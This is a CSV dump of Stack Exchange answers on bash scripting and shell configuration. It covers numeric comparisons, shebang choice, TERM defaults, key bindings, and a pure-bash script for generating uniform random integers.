Title,Id,Tags,Score,Body
"Check if $REPLY is in a range of numbers","118856","<bash><shell-script><arithmetic>","32","<p>The <code>[</code> command/shell builtin has comparison tests, so you can just do</p>

<pre><code>if [ ""$REPLY"" -ge 1 ] &amp;&amp; [ ""$REPLY"" -le 32 ]; then REPLY=-2;
elif [ ""$REPLY"" -ge 33 ] &amp;&amp; [ ""$REPLY"" -le 48 ]; then REPLY=-1; fi
</code></pre>

<p>where <code>-ge</code> means greater-or-equal-to (and so on). The <code>[</code> command is just a command, not special syntax (it's actually the same as <code>test</code>: check out <code>man test</code>), so it NEEDS the space after it. If you write <code>[$REPLY</code> it will try to find a command named <code>[$REPLY</code> and execute it, which won't work. The same goes for closing <code>]</code>.</p>

<p>Here, we're using the <code>&amp;&amp;</code> shell operator to run the second command only if the first is successful. <code>[</code> also supports <code>-a</code> to <em>and</em> two tests, but it's deprecated and its usage should be discouraged as it causes arguments not to be parseable reliably.</p>

<p>Edit: to test if the number is integer (if that can happen in your code), first do the test</p>

<pre><code>if [[ ""$REPLY"" =~ ^[0-9]+$ ]]; then
   existing code
else echo ""$REPLY is not an integer"" &gt;&amp;2 &amp;&amp; exit 1; fi
</code></pre>

<p>Of course all these bracket expressions return 0 (true) or 1 (false) and can be combined. Not only you can put everything in the same bracket, you can also do</p>

<pre><code>if [[ ""$REPLY"" =~ ^[0-9]+$ ]] &amp;&amp; [ ""$REPLY"" -ge 1 ] &amp;&amp; [ ""$REPLY"" -le 32 ]; then ...
</code></pre>

<p>or something similar.</p>
"
"What is the difference if I start bash with ""/bin/bash"" or ""/usr/bin/env bash""?","206350","<bash><environment-variables>","32","<p>In one sense, using <code>env</code> could be considered ""portable"" in that the path to <code>bash</code> is not relevant (<code>/bin/bash</code>, <code>/usr/bin/bash</code>, <code>/usr/local/bin/bash</code>, <code>~/bin/bash</code>, or whatever path) because it is specified in the environment. In this way, a script author could make his script easier to run on many different systems.</p>

<p>In another sense, using <code>env</code> to find <code>bash</code> or any other shell or command  interpreter is considered a security risk because an unknown binary (malware) might be used to execute the script. In these environments, and sometimes by managerial policy, the path is specified explicitly with a full path: <code>#!/bin/bash</code>.</p>

<p>In general, use <code>env</code> unless you know you are writing in one of these environments that scrutinize the minute details of risk.</p>

<p>When Ubuntu first started using <code>dash</code>, some time in 2011, many scripts were broken by that action. There was discussion about it on askubuntu.com. Most scripts were written <code>#!/bin/sh</code> which was a link to <code>/bin/bash</code>. The consensus was this: the script writer is responsible for specifying the interpreter. Therefore, if your script should always be invoked with BASH, specify it from the environment. This saves you having to guess the path, which is different on various Unix/Linux systems. In addition, it will work if tomorrow <code>/bin/sh</code> becomes a link to some other shell like <code>/bin/newsh</code>.</p>

<p>Another difference is that the <code>env</code> method won't allow the passing of arguments to the interpreter.</p>
"
"How can a bash script detect if it is running in the background?","118462","<bash><shell>","32","<p>Quoting <a href=""http://unixhelp.ed.ac.uk/CGI/man-cgi?ps"" rel=""noreferrer""><code>man ps</code></a>:</p>
<h2>PROCESS STATE CODES</h2>
<pre><code>   Here are the different values that the s, stat and state output
   specifiers (header &quot;STAT&quot; or &quot;S&quot;) will display to describe the state of
   a process.
   ...
   +    is in the foreground process group
</code></pre>
<p>So you could perform a simple check:</p>
<pre><code>case $(ps -o stat= -p $$) in
  *+*) echo &quot;Running in foreground&quot; ;;
  *) echo &quot;Running in background&quot; ;;
esac
</code></pre>
"
"How do I force a user to change a password at the first time login using ssh?","173708","<linux><bash><ssh><login><pam>","32","<p>change the age of password to 0 day </p>

<p>syntax <code>chage -d 0 {user-name}</code></p>

<p>In this case </p>

<p><code>chage -d0 foo </code></p>

<p>This works for me over ssh also </p>
"
"If I sudo execute a Bash script file, will all commands inside the Bash script be executed as sudo as well?","115276","<bash><shell-script><shell><sudo>","32","<blockquote>
  <p><strong>Q#1:</strong> Will I only be prompted for a sudo password once, or will I need to enter the sudo password on each invocation of a command inside the script, that needs sudo permission? </p>
</blockquote>

<p>Yes, once, for the duration of the running of your script. </p>

<p><strong>NOTE:</strong> When you provide credentials to <code>sudo</code>, the authentication is typically good for 5 minutes within the shell where you typed the password. Additionally any child processes that get executed from this shell, or any script that runs in the shell (your case) will also run at the elevated level.</p>

<blockquote>
  <p><strong>Q#2:</strong> is there still a possibility that the sudo permissions will time out (if, for instance, a particular command takes long enough to exceed the sudo timeout)? Or will the initial sudo password entrance last for the complete duration of whole script?</p>
</blockquote>

<p>No they will not timeout within the script. Only if you interactively were typing them within the shell where the credentials were provided. Every time <code>sudo</code> is executed within this shell, the timeout is reset. But in your case they credentials will remain so long as the script is executing and running commands from within it.</p>

<em>excerpt from sudo man page</em>

<blockquote>
  <p>This limit is policy-specific; the default password prompt timeout for the sudoers security policy is 5 minutes.</p>
</blockquote>
"
"Glob with Numerical Order","38317","<bash><filenames><wildcards>","32","<p>Depending on your environment you can use <code>ls -v</code> with GNU coreutils, e.g.:</p>

<pre><code>gs -q -sPAPERSIZE=a4 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite \
   -sOutputFile=out.pdf $(ls -v)
</code></pre>

<p>Or if you are on recent versions of FreeBSD or OpenBSD:</p>

<pre><code>gs -q -sPAPERSIZE=a4 -dNOPAUSE -dBATCH -sDEVICE=pdfwrite \
   -sOutputFile=out.pdf $(ls | sort -V)
</code></pre>
"
"How to efficiently generate large, uniformly distributed, random integers in bash?","157250","<bash><shell-script><command-line>","32","<p>Thank you all for all your great answers. I ended up with the following solution, that I would like to share.</p>

<p>Before I go into any more detail about the whys and hows, here's the <strong><em>tl;dr</em></strong>: my shiny new script :-)</p>

<pre><code>#!/usr/bin/env bash
#
# Generates a random integer in a given range

# computes the ceiling of log2
# i.e., for parameter x returns the lowest integer l such that 2**l &gt;= x
log2() {
  local x=$1 n=1 l=0
  while (( x&gt;n &amp;&amp; n&gt;0 ))
  do
    let n*=2 l++
  done
  echo $l
}

# uses $RANDOM to generate an n-bit random bitstring uniformly at random
#  (if we assume $RANDOM is uniformly distributed)
# takes the length n of the bitstring as parameter, n can be up to 60 bits
get_n_rand_bits() {
  local n=$1 rnd=$RANDOM rnd_bitlen=15
  while (( rnd_bitlen &lt; n ))
  do
    rnd=$(( rnd&lt;&lt;15|$RANDOM ))
    let rnd_bitlen+=15
  done
  echo $(( rnd&gt;&gt;(rnd_bitlen-n) ))
}

# alternative implementation of get_n_rand_bits:
# uses /dev/urandom to generate an n-bit random bitstring uniformly at random
#  (if we assume /dev/urandom is uniformly distributed)
# takes the length n of the bitstring as parameter, n can be up to 56 bits
get_n_rand_bits_alt() {
  local n=$1
  local nb_bytes=$(( (n+7)/8 ))
  local rnd=$(od --read-bytes=$nb_bytes --address-radix=n --format=uL /dev/urandom | tr --delete "" "")
  echo $(( rnd&gt;&gt;(nb_bytes*8-n) ))
}

# for parameter max, generates an integer in the range {0..max} uniformly at random
# max can be an arbitrary integer, needs not be a power of 2
rand() {
  local rnd max=$1
  # get number of bits needed to represent $max
  local bitlen=$(log2 $((max+1)))
  while
    # could use get_n_rand_bits_alt instead if /dev/urandom is preferred over $RANDOM
    rnd=$(get_n_rand_bits $bitlen)
    (( rnd &gt; max ))
  do :
  done
  echo $rnd
}

# MAIN SCRIPT

# check number of parameters
if (( $# != 1 &amp;&amp; $# != 2 ))
then
  cat &lt;&lt;EOF 1&gt;&amp;2
Usage: $(basename $0) [min] max

Returns an integer distributed uniformly at random in the range {min..max}
min defaults to 0
(max - min) can be up to 2**60-1  
EOF
  exit 1
fi

# If we have one parameter, set min to 0 and max to $1
# If we have two parameters, set min to $1 and max to $2
max=0
while (( $# &gt; 0 ))
do
  min=$max
  max=$1
  shift
done

# ensure that min &lt;= max
if (( min &gt; max ))
then
  echo ""$(basename $0): error: min is greater than max"" 1&gt;&amp;2
  exit 1
fi

# need absolute value of diff since min (and also max) may be negative
diff=$((max-min)) &amp;&amp; diff=${diff#-}

echo $(( $(rand $diff) + min ))
</code></pre>

<p>Save that to <code>~/bin/rand</code> and you have at your availability a sweet random function in bash that can sample an integer in a given arbitrary range. The range may contain negative and positive integers and can be up to 2<sup>60</sup>-1 in length:</p>

<pre><code>$ rand 
Usage: rand [min] max

Returns an integer distributed uniformly at random in the range {min..max}
min defaults to 0
(max - min) can be up to 2**60-1  
$ rand 1 10
9
$ rand -43543 -124
-15757
$ rand -3 3
1
$ for i in {0..9}; do rand $((2**60-1)); done
777148045699177620
456074454250332606
95080022501817128
993412753202315192
527158971491831964
336543936737015986
1034537273675883580
127413814010621078
758532158881427336
924637728863691573
</code></pre>

<p>All ideas by the other answerers were great. The answers by <a href=""https://unix.stackexchange.com/a/157259"">terdon</a>, <a href=""https://unix.stackexchange.com/a/157321"">J.F. Sebastian</a>, and <a href=""https://unix.stackexchange.com/a/157267"">jimmij</a> used external tools to do the task in a simple and efficient manner. However, I preferred a true bash solution for maximum portability, and maybe a little bit, simply out of love for bash ;)</p>

<p><a href=""https://unix.stackexchange.com/a/157266"">Ramesh</a>'s and <a href=""https://unix.stackexchange.com/a/157263"">l0b0</a>'s answers used <code>/dev/urandom</code> or <code>/dev/random</code> in combination with <code>od</code>. That's good, however, their approaches had the disadvantage of only being able to sample random integers in the range 0 to 2<sup>8n</sup>-1 for some n, since this method samples bytes, i.e., bitstrings of length 8. These are quite big jumps with increasing n.</p>

<p>Finally, <a href=""https://unix.stackexchange.com/a/157274"">Falco</a>'s answer describes the general idea how this could be done for <em>arbitrary</em> ranges (not only powers of two). Basically, for a given range <code>{0..max}</code>, we can determine what the next power of two is, i.e., exactly how many <em>bits</em> are required to represent <code>max</code> as a bitstring. Then we can sample just that many bits and see whether this bistring, as an integer, is greater than <code>max</code>. If so, repeat. Since we sample just as many bits as are required to represent <code>max</code>, each iteration has a probability greater or equal than 50% of succeeding (50% in the worst case, 100% in the best case). So this is very efficient.</p>

<p>My script is basically a concrete implementation of Falco's answer, written in pure bash and highly efficient since it uses bash's built-in bitwise operations to sample bitstrings of the desired length. It additionally honors an idea by <a href=""https://askubuntu.com/questions/525599/how-to-display-a-random-line-from-a-text-file/525624#comment719930_525624"">Eliah Kagan</a> that suggests to use the built-in <code>$RANDOM</code> variable by concatening bitstrings resulting from repeated invocations of <code>$RANDOM</code>. I actually implemented both the possibilities to use <code>/dev/urandom</code> and <code>$RANDOM</code>. By default the above script uses <code>$RANDOM</code>. (And ok, if using <code>/dev/urandom</code> we need <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/od.html"" rel=""nofollow noreferrer"">od</a> and <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/tr.html"" rel=""nofollow noreferrer"">tr</a>, but these are backed by POSIX.)</p>

<h1>So how does it work?</h1>

<p>Before I get into this, two observations:</p>

<ol>
<li><p>It turns out bash can't handle integers larger than 2<sup>63</sup>-1. See for yourself:</p>

<pre><code>$ echo $((2**63-1))
9223372036854775807
$ echo $((2**63))
-9223372036854775808
</code></pre>

<p>It would appear that bash internally uses signed 64-bit integers to store integers. So, at 2<sup>63</sup> it ""wraps around"" and we get a negative integer. So we can't hope to get any range larger than 2<sup>63</sup>-1 with whatever random function we use. Bash simply can't handle it.</p></li>
<li><p>Whenever we want to sample a value in an arbitrary range between <code>min</code> and <code>max</code> with possibly <code>min != 0</code>, we can simply sample a value between <code>0</code> and <code>max-min</code> instead and then add <code>min</code> to the final result. This works even if <code>min</code> and possibly also <code>max</code> are <em>negative</em>, but we need to be careful to sample a value between <code>0</code> and <em>the absolute value of</em> <code>max-min</code>. So then, we can focus on how to sample a random value between <code>0</code> and an arbitrary positive integer <code>max</code>. The rest is easy.</p></li>
</ol>

<p><strong>Step 1: Determine how many bits are needed to represent an integer (the logarithm)</strong></p>

<p>So for a given value <code>max</code>, we want to know just how many bits are needed to represent it as a bitstring. This is so that later we can randomly sample only just as many bits as are needed, which makes the script so efficient.</p>

<p>Let's see. Since with <code>n</code> bits, we can represent up to the value 2<sup>n</sup>-1, then the number <code>n</code> of bits needed to represent an arbitrary value <code>x</code> is ceiling(log<sub>2</sub>(x+1)). So, we need a function to compute the ceiling of a logarithm to the base 2. It is rather self-explanatory:</p>

<pre><code>log2() {
  local x=$1 n=1 l=0
  while (( x&gt;n &amp;&amp; n&gt;0 ))
  do
    let n*=2 l++
  done
  echo $l
}
</code></pre>

<p>We need the condition <code>n&gt;0</code> so if it grows too great, wraps around and becomes negative, the loop is guaranteed to terminate.</p>

<p><strong>Step 2: Sample a random a bitstring of length <code>n</code></strong></p>

<p>The most portable ideas are to either use <code>/dev/urandom</code> (or even <code>/dev/random</code> if there is a strong reason) or bash's built-in <code>$RANDOM</code> variable. Let's look at how to do it with <code>$RANDOM</code> first.</p>

<p><em>Option A: Using <code>$RANDOM</code></em></p>

<p>This uses the <a href=""https://askubuntu.com/questions/525599/how-to-display-a-random-line-from-a-text-file/525624#comment719930_525624"">idea</a> mentioned by Eliah Kagan. Basically, since <code>$RANDOM</code> samples a 15-bit integer, we can use <code>$((RANDOM&lt;&lt;15|RANDOM))</code> to sample a 30-bit integer. That means, shift a first invocation of <code>$RANDOM</code> by 15 bits to the left, and apply a bitwise or with a second invocation of <code>$RANDOM</code>, effectively concatening two independently sampled bitstrings (or at least as independent as bash's built-in <code>$RANDOM</code> goes).</p>

<p>We can repeat this to obtain a 45-bit or 60-bit integer. After that bash can't handle it anymore, but this means we can easily sample a random value between 0 and 2<sup>60</sup>-1. So, to sample an n-bit integer, we repeat the procedure until our random bitstring, whose length grows in 15-bit steps, has a length greater or equal than n. Finally, we cut off the bits that are too much by appropriately bitwise shifting to the right, and we end up with a n-bit random integer.</p>

<pre><code>get_n_rand_bits() {
  local n=$1 rnd=$RANDOM rnd_bitlen=15
  while (( rnd_bitlen &lt; n ))
  do
    rnd=$(( rnd&lt;&lt;15|$RANDOM ))
    let rnd_bitlen+=15
  done
  echo $(( rnd&gt;&gt;(rnd_bitlen-n) ))
}
</code></pre>

<p><em>Option B: Using <code>/dev/urandom</code></em></p>

<p>Alternatively, we can use <code>od</code> and <code>/dev/urandom</code> to sample an n-bit integer. <code>od</code> will read bytes, i.e., bitstrings of length 8. Similarly as in the previous method, we sample just so many bytes that the equivalent number of sampled <em>bits</em> is greater or equal than n, and cut off the bits that are too much.</p>

<p>The lowest number of bytes needed to get at least n bits is the lowest multiple of 8 that is greater or equal than n, i.e., floor((n+7)/8).</p>

<p>This only works up to 56-bit integers. Sampling one more byte would get us an 64-bit integer, i.e., a value up to 2<sup>64</sup>-1, which bash can't handle.</p>

<pre><code>get_n_rand_bits_alt() {
  local n=$1
  local nb_bytes=$(( (n+7)/8 ))
  local rnd=$(od --read-bytes=$nb_bytes --address-radix=n --format=uL /dev/urandom | tr --delete "" "")
  echo $(( rnd&gt;&gt;(nb_bytes*8-n) ))
}
</code></pre>

<p><strong>Putting the pieces together: Get random integers in <em>arbitrary</em> ranges</strong></p>

<p>We can sample <code>n</code>-bit bitstrings now, but we want to sample integers in a range from <code>0</code> to <code>max</code>, <em>uniformly at random</em>, where <code>max</code> may be arbitrary, not necessarily a power of two. (We can't use modulo as that creates a bias.)</p>

<p>The whole point why we tried so hard to sample just as many bits as are needed to represent the value <code>max</code>, is that we can now safely (and efficiently) use a loop to repeatedly sample an <code>n</code>-bit bitstring until we sample a value that is lower or equal to <code>max</code>. In the worst case (<code>max</code> is a power of two), each iteration terminates with a probability of 50%, and in the best case (<code>max</code> is a power of two minus one), the first iteration terminates with certainty.</p>

<pre><code>rand() {
  local rnd max=$1
  # get number of bits needed to represent $max
  local bitlen=$(log2 $((max+1)))
  while
    # could use get_n_rand_bits_alt instead if /dev/urandom is preferred over $RANDOM
    rnd=$(get_n_rand_bits $bitlen)
    (( rnd &gt; max ))
  do :
  done
  echo $rnd
}
</code></pre>

<p><strong>Wrapping things up</strong></p>

<p>Finally, we want to sample integers between <code>min</code> and <code>max</code>, where <code>min</code> and <code>max</code> can be arbitrary, even negative. As previously mentioned, this is now trivial.</p>

<p>Let's put it all in a bash script. Do some argument parsing stuff... We want two arguments <code>min</code> and <code>max</code>, or only one argument <code>max</code>, where <code>min</code> defaults to <code>0</code>.</p>

<pre><code># check number of parameters
if (( $# != 1 &amp;&amp; $# != 2 ))
then
  cat &lt;&lt;EOF 1&gt;&amp;2
Usage: $(basename $0) [min] max

Returns an integer distributed uniformly at random in the range {min..max}
min defaults to 0
(max - min) can be up to 2**60-1  
EOF
  exit 1
fi

# If we have one parameter, set min to 0 and max to $1
# If we have two parameters, set min to $1 and max to $2
max=0
while (( $# &gt; 0 ))
do
  min=$max
  max=$1
  shift
done

# ensure that min &lt;= max
if (( min &gt; max ))
then
  echo ""$(basename $0): error: min is greater than max"" 1&gt;&amp;2
  exit 1
fi
</code></pre>

<p>...and, finally, to sample uniformly at random a value between <code>min</code> and <code>max</code>, we sample a random integer between <code>0</code> and the absolute value of <code>max-min</code>, and add <code>min</code> to the final result. :-)</p>

<pre><code>diff=$((max-min)) &amp;&amp; diff=${diff#-}

echo $(( $(rand $diff) + min ))
</code></pre>

<p>Inspired by <a href=""https://askubuntu.com/questions/525599/how-to-display-a-random-line-from-a-text-file/525624#comment721328_525624"">this</a>, I might try to use <a href=""http://manpages.ubuntu.com/manpages/trusty/man1/dieharder.1.html"" rel=""nofollow noreferrer"">dieharder</a> to test and benchmark this PRNG, and put my findings in here. :-)</p>
"
"Where does the TERM environment variable default get set?","198794","<bash><shell><terminal><environment-variables><colors>","32","<h1>In lots of places, depending</h1>

<p>On virtual terminals and real terminals, the <code>TERM</code> environment variable is set by the program that chains to <code>login</code>, and is inherited all of the way along to the interactive shell that executes once one has logged on.  Where, precisely, this happens varies from system to system, and according to the kind of terminal.</p>

<h2>real terminals</h2>

<p>Real, serial, terminals can vary in type, according to what's at the other end of the wire.  So conventionally the <code>getty</code> program is invoked with an argument that specifies the terminal type, or is passed the <code>TERM</code> program from a service manager's service configuration data.</p>

<ul>
<li>On van Smoorenburg <code>init</code> systems, one can see this in <code>/etc/inittab</code> entries, which will read something along the lines of </p><p><pre>S0:3:respawn:/sbin/agetty ttyS0 9600 vt100-nav</pre> The last argument to <code>agetty</code> in that line, <code>vt100-nav</code>, is the terminal type set for <code>/dev/ttyS0</code>.  So <code>/etc/inittab</code> is where to change the terminal type for real terminals on such systems.</li>
<li>On systemd systems, one used to be able to see this in the <code>/usr/lib/systemd/system/serial-getty@.service</code> unit file (<code>/lib/systemd/system/serial-getty@.service</code> on un-merged systems), which used to read </p><p><pre>Environment=TERM=vt100</pre> setting the <code>TERM</code> variable in the environment passed to <code>agetty</code>.</li>
<li>On the BSDs, <code>init</code> takes the terminal type from the third field of each terminal's entry in the <code>/etc/ttys</code> database, and sets <code>TERM</code> from that in the environment that it executes <code>getty</code> with.  So <code>/etc/ttys</code> is where one changes the terminal type for real terminals on the BSDs.</li>
</ul>

<h2>systemd's variability</h2>

<p>The <code>serial-getty@.service</code> service unit file, or drop-in files that apply thereto, is where to change the terminal type for real terminals on systemd systems.  Note that such a change applies to <em>all</em> terminal login services that employ this service unit template.  (To change it for only individual terminals, one has to manually instantiate the template, or add drop-ins that only apply to instantiations.)</p>

<p>systemd has had at least four mechanisms during its lifetime for picking up the value of the <code>TERM</code> environment variable.  At the time of first writing this answer, as can be seen, there was an <code>Environment=TERM=<i>something</i></code> line in the template service unit files.  At other times, the types <code>linux</code> and <code>vt102</code> were hard-wired into the <code>getty</code> and <code>serial-getty</code> service unit files respectively.  More recently, the environment variable has been inherited from process #1, which has set it in various ways.</p>

<p>As of 2020, the way that systemd decides what terminal type to specify in a service's <code>TERM</code> environment variable is quite complex, and not documented at all.  The way to change it remains a drop-in configuration file with <code>Environment=TERM=<i>something</i></code>.  But <em>where the default value originates from</em> is quite variable.  Subject to some fairly complex to explain rules that involve the <code>TTYPath=</code> settings of individual service units, <a href=""https://github.com/systemd/systemd/blob/693040bde5162c8af3d0f063414288eba5255b3c/src/core/execute.c#L1792"" rel=""nofollow noreferrer"">it can be one of three values</a>: a hardwired <code>linux</code>, a hardwired <code>vt220</code> (no longer <code>vt102</code>), or the value of the <code>TERM</code> environment variable that process #1 inherited, usually from the kernel/bootstrap loader.</p>

<p>(Ironically, the <code>getttyent()</code> mechanism still exists in the GNU C library, and systemd could have re-used the <code>/etc/ttys</code> mechanism.)</p>

<h2>kernel virtual terminals</h2>

<p>Kernel virtual terminals, as you have noted, have a fixed type.  Unlike NetBSD, which can vary the kernel virtual terminal type on the fly, Linux and the other BSDs have a single fixed terminal type implemented in the kernel's built-in terminal emulation program.  On Linux, that type matches <code>linux</code> from the terminfo database.  (FreeBSD's kernel terminal emulation since version 9 has been <code>teken</code>.  Prior to version 9 it was <code>cons25</code>  OpenBSD's is <code>pccon</code>.)</p>

<ul>
<li>On systems using <code>mingetty</code> or <code>vc-get-tty</code> (from the nosh package) the program ""knows"" that it can only be talking to a virtual terminal, and they hardwire the ""known"" virtual terminal types appropriate to the operating system that the program was compiled for.</li>
<li>On systemd systems, one used to be able to see this in the <code>/usr/lib/systemd/system/getty@.service</code> unit file (<code>/lib/systemd/system/getty@.service</code> on un-merged systems), which read </p><p><pre>Environment=TERM=linux</pre> setting the <code>TERM</code> variable in the environment passed to <code>agetty</code>.</li>
</ul>

<p>For kernel virtual terminals, one <em>does not</em> change the terminal type.  The terminal emulator program in the kernel doesn't change, after all.  It is <em>incorrect</em> to change the type.  In particular, this will screw up cursor/editing key CSI sequence recognition.  The <code>linux</code> CSI sequences sent by the Linux kernel terminal emulator are different to the <code>xterm</code> or <code>vt100</code> CSI sequences sent by GUI terminal emulator programs in DEC VT mode.  (In fact, they are highly idiosyncratic and non-standard, and different both to all real terminals that I know of, and to pretty much all other software terminal emulators apart from the one built into Linux.)</p>

<h2>GUI terminal emulators</h2>

<p>Your GUI terminal emulator is one of many programs, from the SSH d&aelig;mon to <code>screen</code>, that uses pseudo-terminals.  What the terminal type is depends from what terminal emulator program is running on the master side of the pseudo-terminal, and how it is configured.  Most GUI terminal emulators will start the program on the slave side with a <code>TERM</code> variable whose value matches their terminal emulation on the master side.  Programs like the SSH server will attempt to ""pass through"" the terminal type that is on the client end of the connection.  Usually there is some menu or configuration option to choose amongst terminal emulations.</p>

<h1>The gripping hand</h1>

<p>The right way to detect colour capability is <em>not</em> to hardwire a list of terminal types in your script.  There are an awful lot of terminal types that support colour.</p>

<p>The right way is to look at what termcap/terminfo says about your terminal type.<pre>colour=0
if tput Co &gt; /dev/null 2>&amp;1
then
    test ""`tput Co`"" -gt 2 &amp;&amp; colour=1
elif tput colors &gt; /dev/null 2>&amp;1
then
    test ""`tput colors`"" -gt 2 &amp;&amp; colour=1
fi</pre></p>

<h1>Further reading</h1>

<ul>
<li>Jonathan de Boyne Pollard (2018). <a href=""http://jdebp.eu./Softwares/nosh/guide/TERM.html"" rel=""nofollow noreferrer""><code>TERM</code></a>. <em>nosh Guide</em>. Softwares.</li>
</ul>
"
"ESC + { : What is it and where I can know more about it?","260125","<bash><command-line><keyboard-shortcuts><line-editor>","32","<p>To find out about a key binding.</p>

<h2>In <code>bash</code>:</h2>

<pre><code>$ bind -p | grep -a '{'
""\e{"": complete-into-braces
""{"": self-insert

$ LESS='+/complete-into-braces' man  bash
   complete-into-braces (M-{)
          Perform filename completion and insert the list of possible com‐
          pletions  enclosed within braces so the list is available to the
          shell (see Brace Expansion above).
</code></pre>

<p>Or with <code>info</code>:</p>

<pre><code>info bash --index-search=complete-into-braces
</code></pre>

<p>(or <code>info bash</code> and use the <em>index</em> with completion (<code>i</code> key))</p>

<p>However note that the pre-built info page that comes with bash-4.3 sources at least is missing some index entries including that for <code>complete-into-braces</code>, so unless your OS rebuilds the info page from the texinfo sources, the above command won't work.</p>

<h1>In <code>zsh</code></h1>

<pre><code>$ bindkey| grep W
""^W"" backward-kill-word
""^[W"" copy-region-as-kill
$ info --index-search=copy-region-as-kill zsh
copy-region-as-kill (ESC-W ESC-w) (unbound) (unbound)
 Copy the area from the cursor to the mark to the kill buffer.

 If called from a ZLE widget function in the form 'zle
 copy-region-as-kill STRING' then STRING will be taken as the text
 to copy to the kill buffer.  The cursor, the mark and the text on
 the command line are not used in this case.
</code></pre>

<p>Or with <code>man</code> assuming the <code>less</code> pager like for <code>bash</code>:</p>

<pre><code>LESS='+/copy-region-as-kill' man zshall
</code></pre>

<p><code>zsh</code> also has a <code>describe-key-briefly</code> which you can bind on a key or key sequence, like <kbd>Ctrl+X</kbd><kbd>Ctrl+H</kbd> below:</p>

<pre><code>bindkey '^X^H' describe-key-briefly
</code></pre>

<p>Then you type <kbd>Ctrl+X</kbd><kbd>Ctrl+H</kbd> followed by the key or key combination to describe. For instance, typing that <kbd>Ctrl+X</kbd><kbd>Ctrl+H</kbd> twice would display below the prompt:</p>

<pre><code>""^X^H"" is describe-key-briefly
</code></pre>

<h2>In <code>tcsh</code></h2>

<p>That's basically the same as <code>zsh</code> except that <code>tcsh</code> doesn't have an info page.</p>

<pre><code>&gt; bindkey | grep -a P
""^P""           -&gt;  up-history
""^[P""          -&gt; history-search-backward
&gt; env LESS=+/history-search-backward man tcsh
[...]
</code></pre>

<h2>In <code>fish</code>:</h2>

<pre><code>&gt; bind | grep -F '\ec'
bind \ec capitalize-word
&gt; help commands
</code></pre>

<p>Which should start your preferred web browser. And search for <code>capitalize-word</code> in there. </p>
"
"Bash autocomplete: first list files then cycle through them","55203","<bash><autocomplete>","32","<p>This seems close to what you want:</p>

<pre><code>bind ""TAB:menu-complete""
bind ""set show-all-if-ambiguous on""
</code></pre>
"
